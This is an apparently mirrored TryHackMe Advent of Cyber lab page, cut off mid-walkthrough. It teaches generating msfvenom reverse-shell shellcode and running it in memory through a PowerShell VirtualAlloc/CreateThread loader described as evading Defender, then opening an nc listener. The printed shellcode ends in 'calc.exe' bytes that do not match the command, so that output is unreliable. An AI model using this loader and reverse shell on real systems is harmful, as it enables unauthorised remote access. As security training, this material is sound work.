@@ -1,0 +1,519 @@
+<!doctype html>
+<html>
+  <head>
+  <title>
+    
+      Day8 | THM Advent of Cyber 2024
+    
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+  <!-- Use Atom -->
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="THM Advent of Cyber 2024" />
+  <!-- RSS-v2.0
+  <link href="/rss-feed.xml" type="application/rss+xml" rel="alternate" title="THM Advent of Cyber 2024 | a minimalist Jekyll theme for running a blog or publication"/>
+  //-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto|Source+Code+Pro">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+  </script>
+  <!-- Google Analytics -->
+  <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', '', 'auto');
+  ga('send', 'pageview');
+</script>
+
+  <!-- Use Jekyll SEO plugin -->
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Day8 | THM Advent of Cyber 2024</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Day8" />
+<meta name="author" content="Michael" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="The Story" />
+<meta property="og:description" content="The Story" />
+<link rel="canonical" href="http://localhost:4000/Day8" />
+<meta property="og:url" content="http://localhost:4000/Day8" />
+<meta property="og:site_name" content="THM Advent of Cyber 2024" />
+<meta property="og:image" content="http://localhost:4000/Day8-logo.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-08T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/Day8-logo.png" />
+<meta property="twitter:title" content="Day8" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Michael"},"dateModified":"2024-12-08T00:00:00-05:00","datePublished":"2024-12-08T00:00:00-05:00","description":"The Story","headline":"Day8","image":"http://localhost:4000/Day8-logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Day8"},"url":"http://localhost:4000/Day8"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+  <body>
+    <div class="container">
+      <header class="site-header">
+  <h3 class="site-title">
+    <a href="/">THM Advent of Cyber 2024</a>
+  </h3>
+  <nav class="menu-list">
+    
+      <a href="/about" class="menu-link">About</a>
+    
+      <a href="/contact" class="menu-link">Contact</a>
+    
+    
+      <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+      <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+    
+  </nav>
+  <div class="dropdown">
+    <button class="dropbtn"><i class="fa fa-bars" aria-hidden="true"></i></button>
+    <div class="dropdown-content">
+      
+        <a href="/about" class="menu-link">About</a>
+      
+        <a href="/contact" class="menu-link">Contact</a>
+      
+      
+        <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+      
+        <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+      
+    </div>
+  </div>
+</header>
+
+      <div class="content-wrapper">
+        <div class="post-content">
+  <h1>
+    Day8
+  </h1>
+  
+    <span class="post-date">
+  Written on
+  
+  December
+  8th,
+  2024
+  by
+  
+    Michael
+  
+</span>
+
+  
+  
+    <div class="featured-image">
+      <img src="/assets/img/Day8-logo.png">
+    </div>
+  
+  <article>
+    <p>The Story</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730451713924.svg" alt="Task banner for day 8" /></p>
+
+<p><em>Glitch the hacker, clever yet distrusted,</em></p>
+
+<p><em>Wrote a script with skills finely adjusted.</em></p>
+
+<p><em>Shellcode magic to his home it would send,</em></p>
+
+<p><em>Where secrets of Wareville he’d carefully penned.</em></p>
+
+<p>\n</p>
+
+<p>Glitch, a skilled but mistrusted hacker, was prepping for a tech conference. He was eager to share his shellcode script that remotely accessed his home system. As he worked, he noticed Mayor Malware’s henchmen lurking nearby.</p>
+
+<p><em>“They’re wasting their time. I don’t have anything they’d want,”</em> Glitch chuckled.</p>
+
+<p>He didn’t realise that hidden in his home system was something they desperately sought—a research paper he wrote on Wareville’s defences, a treasure Mayor Malware was eager to obtain.</p>
+
+<h2 id="learning-objectives">Learning Objectives</h2>
+
+<ul>
+  <li>Grasp the fundamentals of writing shellcode</li>
+  <li>Generate shellcode for reverse shells</li>
+  <li>Executing shellcode with PowerShell</li>
+</ul>
+
+<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>
+
+<p>Before moving forward, review the questions in the connection card shown below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731050107820.png" alt="Task connection card." /></p>
+
+<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> button below to start the virtual machine in split-screen view. If the VM is not visible, use the blue <code class="language-plaintext highlighter-rouge">Show Split View</code> button at the top of the page. Alternatively, you can connect to the VM via Remote Desktop (RDP) using the credentials below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM key" /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Username</strong></th>
+      <th>glitch</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Password</strong></td>
+      <td>Passw0rd</td>
+    </tr>
+    <tr>
+      <td><strong>IP</strong></td>
+      <td>MACHINE_IP</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Aside from the VM, you must also start the AttackBox for this task. Click on the <code class="language-plaintext highlighter-rouge">Start AttackBox</code> button located above this page.</p>
+
+<h2 id="essential-terminologies">Essential Terminologies</h2>
+
+<p><em>A reverse shell to his system so tight,</em></p>
+
+<p><em>He planned to showcase at the tech conference night.</em></p>
+
+<p><em>Eager to share how his shellcode could impress,</em></p>
+
+<p><em>He aimed to enlighten, to teach and progress.</em></p>
+
+<ul>
+  <li>\n *</li>
+</ul>
+
+<p>Before we start, review some important concepts to help you better understand the upcoming content. Shellcode is an advanced topic, but knowing these foundational ideas will make the rest of the material more accessible and engaging.</p>
+
+<ul>
+  <li><strong>Shellcode</strong>: A piece of code usually used by malicious actors during exploits like buffer overflow attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.</li>
+  <li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728375094892.png" alt="anti-virus shield depicting protection" /><strong>PowerShell</strong>: A powerful scripting language and command-line shell built into Windows for task automation and configuration management. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often use PowerShell as a post-exploitation tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms.</li>
+  <li><strong>Windows Defender</strong>: A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include obfuscating scripts to disguise malicious content, making it harder for the software to recognise known patterns. Another technique is a reflective injection, where malicious code is loaded directly into memory, avoiding detection by signature-based defences. We will cover the latter one in this task. \n</li>
+  <li><strong>Windows API</strong>: The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The Windows API is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common Windows API functions frequently used by malicious actors include <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, <code class="language-plaintext highlighter-rouge">CreateThread</code>, <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code>, which we will also use in this task for exploitation.</li>
+  <li><strong>Accessing Windows API through PowerShell Reflection</strong>: Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.</li>
+  <li><strong>Reverse shell</strong>: A type of connection in which the target (the machine you’re trying to hack) initiates a connection back to your attacking machine (in this case, your machine will be the AttackBox). </li>
+  <li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728375153734.png" alt="process flow of reverse shell" /></li>
+</ul>
+
+<h2 id="generating-shellcode">Generating Shellcode</h2>
+
+<p><em>But Mayor Malware’s minions, sneaky and sly,</em></p>
+
+<p><em>Found his script and gave it a try.</em></p>
+
+<p><em>They tampered the code, changed port and IP,</em></p>
+
+<p><em>Twisted his work with a sinister glee.</em></p>
+
+<ul>
+  <li>\n *</li>
+</ul>
+
+<p>Let’s learn how to generate a shellcode to see what it looks like. To do this, we will use a tool called <code class="language-plaintext highlighter-rouge">msfvenom</code> to get a reverse shell. \n</p>
+
+<p>In the AttackBox, open the terminal and enter the command <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell</code> that will generate the shellcode. The output will look like the following.  You will require to replace the <code class="language-plaintext highlighter-rouge">ATTACKBOX_IP</code> with the IP of the AttackBox.</p>
+
+<p>AttackBox Terminal</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="nx">ATTACKBOX_IP</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">1111</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">powershell</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">platform</span> <span class="nx">was</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">choosing</span> <span class="nx">Msf</span><span class="p">::</span><span class="nx">Module</span><span class="p">::</span><span class="nx">Platform</span><span class="p">::</span><span class="nx">Windows</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">arch</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">selecting</span> <span class="nx">arch</span><span class="p">:</span> <span class="nx">x64</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
+<span class="nx">No</span> <span class="nx">encoder</span> <span class="nx">specified</span><span class="p">,</span> <span class="nx">outputting</span> <span class="nx">raw</span> <span class="nx">payload</span>
+<span class="nx">Payload</span> <span class="nx">size</span><span class="p">:</span> <span class="mi">460</span> <span class="nx">bytes</span>
+<span class="nx">Final</span> <span class="nx">size</span> <span class="k">of</span> <span class="nx">powershell</span> <span class="nx">file</span><span class="p">:</span> <span class="mi">2259</span> <span class="nx">bytes</span>
+<span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="mh">0xfc</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe5</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span>
+<span class="mh">0x30</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0xc</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0xb7</span><span class="p">,</span><span class="mh">0x4a</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
+<span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0xe2</span><span class="p">,</span><span class="mh">0xf2</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span>
+<span class="mh">0x10</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4a</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd1</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span>
+<span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd6</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
+<span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x3</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span>
+<span class="mh">0xe4</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0xc</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span>
+<span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
+<span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0xb2</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span>
+<span class="mh">0x0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span>
+<span class="mh">0xa6</span><span class="p">,</span><span class="mh">0x95</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x9d</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x6</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0xa</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x5</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span>
+<span class="mh">0x47</span><span class="p">,</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x0</span>
+</code></pre></div></div>
+
+<p>The above command generates a piece of shellcode using <code class="language-plaintext highlighter-rouge">msfvenom</code>. Here’s what each part means:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-p windows/x64/shell_reverse_tcp</code>: The <code class="language-plaintext highlighter-rouge">-p</code> flag tells <code class="language-plaintext highlighter-rouge">msfvenom</code> what type of payload to create. <code class="language-plaintext highlighter-rouge">windows/x64/shell_reverse_tcp</code> specifies that we want a reverse shell for a Windows machine.</li>
+  <li><code class="language-plaintext highlighter-rouge">LHOST=ATTACKBOX_IP</code>: This is the IP address of the AttackBox. It tells the reverse shell where to connect back to.</li>
+  <li><code class="language-plaintext highlighter-rouge">LPORT=1111</code>: This is the port number on your machine that will listen for the reverse shell connection. When the target connects back to you, it will use this port (<code class="language-plaintext highlighter-rouge">1111</code> in this example). You can choose any available port, but it needs to match with what your listener is set to.</li>
+  <li><code class="language-plaintext highlighter-rouge">-f powershell</code>: This specifies the format for the output. In this case, we want the payload to be in PowerShell format so it can be executed as a script on a Windows machine. \n</li>
+</ul>
+
+<p><strong>Where Is the Actual Shellcode</strong></p>
+
+<p>The actual shellcode in the output above is the hex-encoded byte array, which starts with <code class="language-plaintext highlighter-rouge">0xfc, 0xe8, 0x82</code>, and so on. The hexadecimal numbers represent the instructions set on the target machine. Computers understand binary (1s and 0s), but hex numbers are just a more human-readable version. So, instead of seeing long strings of 1s and 0s, you see something like <code class="language-plaintext highlighter-rouge">0xfc</code> instead. \n</p>
+
+<p>We can execute this shellcode by loading it into memory and then creating a thread for its execution. In this case, we will use PowerShell to call a few Windows APIs via C# code. Below is a simple PowerShell script that will execute our shellcode:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">$VrtAlloc</span> <span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class VrtAlloc{
+    [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+}
+</span><span class="dl">"</span><span class="p">@</span>
+
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$VrtAlloc</span>
+
+<span class="nx">$WaitFor</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class WaitFor{
+ [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="dl">"</span><span class="s2">, SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+</span><span class="dl">"</span><span class="p">@</span>
+
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$WaitFor</span>
+
+<span class="nx">$CrtThread</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class CrtThread{
+ [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">, CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+}
+</span><span class="dl">"</span><span class="p">@</span>
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$CrtThread</span>
+
+<span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="nx">SHELLCODE_PLACEHOLDER</span>
+<span class="p">[</span><span class="nx">IntPtr</span><span class="p">]</span><span class="nx">$addr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">VrtAlloc</span><span class="p">]::</span><span class="nc">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
+<span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]::</span><span class="nc">Copy</span><span class="p">(</span><span class="nx">$buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">)</span>
+<span class="nx">$thandle</span> <span class="o">=</span> <span class="p">[</span><span class="nx">CrtThread</span><span class="p">]::</span><span class="nc">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">[</span><span class="nx">WaitFor</span><span class="p">]::</span><span class="nc">WaitForSingleObject</span><span class="p">(</span><span class="nx">$thandle</span><span class="p">,</span> <span class="p">[</span><span class="nx">uint32</span><span class="p">]</span><span class="dl">"</span><span class="s2">0xFFFFFFFF</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><em>Phew!</em> That’s a lot of code. But don’t stress. We’ll break down what it does step by step.</p>
+
+<p>If you’re new to cyber security, memorising these functions is unnecessary. Most penetration testers use pre-made or automated tools to run shellcode, so you don’t have to know every technical detail to complete the job. No need to worry! \n</p>
+
+<p><strong>Explanation of the Code</strong></p>
+
+<p>The script starts by defining a few C# classes. These classes use the <code class="language-plaintext highlighter-rouge">DllImport</code> attribute to load specific functions from the <code class="language-plaintext highlighter-rouge">kernel32</code> DLL, which is part of the Windows API. \n</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">VirtualAlloc</code>: This function allocates memory in the process’s address space. It’s commonly used in scenarios like this to prepare memory for storing and executing shellcode.</li>
+  <li><code class="language-plaintext highlighter-rouge">CreateThread</code>: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.</li>
+  <li><code class="language-plaintext highlighter-rouge">WaitForSingleObject</code>: This function pauses execution until a specific thread finishes its task. In this case, it ensures that the shellcode has completed execution.</li>
+</ul>
+
+<p>These classes are then added to PowerShell using the <code class="language-plaintext highlighter-rouge">Add-Type</code> command, allowing PowerShell to use these functions.</p>
+
+<p><strong>Storing the Shellcode in a Byte Array</strong></p>
+
+<p>Next, the script stores the shellcode in the <code class="language-plaintext highlighter-rouge">$buf</code> variable, a byte array. In the example above, <code class="language-plaintext highlighter-rouge">SHELLCODE_PLACEHOLDER</code> is just there to show where you would insert the actual shellcode earlier generated through <code class="language-plaintext highlighter-rouge">msfvenom</code>. Usually, you’d replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.</p>
+
+<p><strong>Allocating Memory for the Shellcode</strong></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> function then allocates a block of memory where the shellcode will be stored. The script uses the following arguments:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">0</code> for the memory address, meaning that Windows will decide where to allocate the memory.</li>
+  <li><code class="language-plaintext highlighter-rouge">$size</code> for the size of the memory block, which is determined by the length of the shellcode.</li>
+  <li><code class="language-plaintext highlighter-rouge">0x3000</code> for the allocation type, which tells Windows to reserve and commit the memory.</li>
+  <li><code class="language-plaintext highlighter-rouge">0x40</code> for memory protection, the memory is readable and executable (necessary for executing shellcode).</li>
+</ul>
+
+<p>After memory is allocated, the <code class="language-plaintext highlighter-rouge">Marshal.Copy</code> function copies the shellcode from the <code class="language-plaintext highlighter-rouge">$buf</code> array into the allocated memory address (<code class="language-plaintext highlighter-rouge">$addr</code>), preparing it for execution.</p>
+
+<p><strong>Executing the Shellcode and Waiting for Completion</strong></p>
+
+<p>Once the shellcode is stored in memory, the script calls the <code class="language-plaintext highlighter-rouge">CreateThread</code> function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (<code class="language-plaintext highlighter-rouge">$addr</code>). The script then uses the <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code> function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.</p>
+
+<h2 id="time-for-some-action---executing-the-shellcode">Time for Some Action - Executing the Shellcode</h2>
+
+<p>On the AttackBox, execute the command <code class="language-plaintext highlighter-rouge">nc -nvlp 1111</code> to start a listener on port <code class="language-plaintext highlighter-rouge">1111</code> and wait for an incoming connection. This command opens port <code class="language-plaintext highlighter-rouge">1111</code> and listens for connections, allowing the AttackBox to receive data once a connection is made.</p>
+
+<p>AttackBox Terminal</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">nvlp</span> <span class="mi">1111</span>
